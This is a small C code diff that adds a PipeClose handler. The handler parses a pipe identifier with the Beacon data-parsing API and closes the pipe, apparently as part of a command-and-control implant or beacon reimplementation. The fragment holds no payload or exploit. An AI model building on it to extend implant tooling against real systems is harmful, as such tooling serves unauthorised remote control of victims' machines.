@@ -167,3 +167,11 @@ void PipeCloseInternal(int bid)
 		}
 	}
 }
+
+void PipeClose(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int bid = BeaconDataInt(&parser);
+	PipeCloseInternal(bid);
+}
